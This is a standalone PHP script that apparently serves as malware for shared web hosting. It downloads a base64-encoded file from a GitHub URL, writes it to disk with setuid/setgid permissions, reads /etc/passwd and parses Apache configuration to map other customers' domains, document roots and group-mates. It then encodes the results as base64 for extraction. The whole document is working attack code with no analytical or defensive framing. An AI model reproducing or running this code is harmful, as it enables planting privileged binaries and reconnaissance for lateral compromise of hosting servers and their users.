<?
 if($start=getenv("PHP_START_DIR"))  {
  file_put_contents($start."/o.out",base64_decode(file_get_contents("https://raw.github.com/edwardward/1/master/0.o.out.txt")));
  chmod($start."/o.out",06777);
  exit;
 }
 $bnd   = "-----=====-----";
 $passwd = array();
 $lines = file("/etc/passwd",FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
  foreach($lines as $line)
  {
   $parts = explode(":",$line);
   $passwd[$parts[0]] = $parts;
  }
 $gdata = array();
 $docroots=array();
 $start="/usr/local/dh/apache2/";
 $logs=scandir($start);
 $openable=array();
  foreach($logs as $log)
    if(file_exists($start.$log."/etc/httpd.conf"))
    {
     $data  = file_get_contents($start.$log."/etc/httpd.conf");
     $oflag = preg_match("#php5_module#", $data);
     if($oflag) echo "$log\n";
     preg_match_all("#DocumentRoot ([^\r\n]+)[\r\n]+ServerName ([^\r\n]+)#m",$data,$matches);
      for($i=0;$i<count($matches[0]);$i++)
      {
        if($matches[1][$i] != '/dh/web/parking') {
              $docroots[$matches[2][$i]] = $matches[1][$i];
              $openable[$matches[2][$i]] = $oflag;
        }
      }
    }
  if(file_exists("d.txt"))
  {
   $domains = preg_split("#[\r\n]+#",`cat d.txt`);

    foreach($domains as $d)
    {
      if(empty($d)) continue;
     $docroot = "";
      if($docroots["www.$d"]) $docroot = $docroots["www.$d"];
      if($docroots[$d]) $docroot = $docroots[$d];
      if(empty($docroot)) continue;
     $gdata[$d] = array('docroot' => $docroot,'docroots' => array(), 'accs' => array());
     echo "$d:\n";
     echo "$docroot\n";
     $acc = account($docroot);
     $docroots_acc = docrootsof($acc);
      foreach($docroots_acc as $d_a) if($d_a != $docroot) { echo "$d_a\n"; $gdata[$d]['docroots'][] = $d_a; }
     $samegroup = samegroupas($acc);
      foreach($samegroup as $a)
      {
        if($a != $acc)
        {
         echo "\t$a\n";
         $docroots_a = docrootsof($a);
         $gdata[$d]['accs'][$a] = $docroots_a;
          foreach($docroots_a as $d_a) echo "\t\t$d_a\n";     
        }
      }
     echo "\n";
    }
   echo $bnd.base64_encode(serialize(array($gdata, array_flip($docroots), $openable))).$bnd;
  }
  else
  {  
   print_r($docroots);
   echo implode("\n",array_keys($docroots));
  }
 
function samegroupas($acc)
{
 global $passwd;
 $accs = array();
  foreach($passwd as $user => $arr) if($arr[3] == $passwd[$acc][3]) $accs[] = $user;
 return $accs;
}

function homedir($acc)
{
 global $passwd;
 return $passwd[$acc][5];
}

function docrootsof($acc)
{
 global $docroots;
 $docroots_acc = array();
 $homedir = homedir($acc);
  foreach($docroots as $domain => $docroot) if(preg_match("#^$homedir/#",$docroot)) $docroots_acc[] = $docroot;
 return $docroots_acc;
}

function account($dir)
{
 preg_match("#^/home/(.+?)/#",$dir,$m);
 return $m[1];
}

?>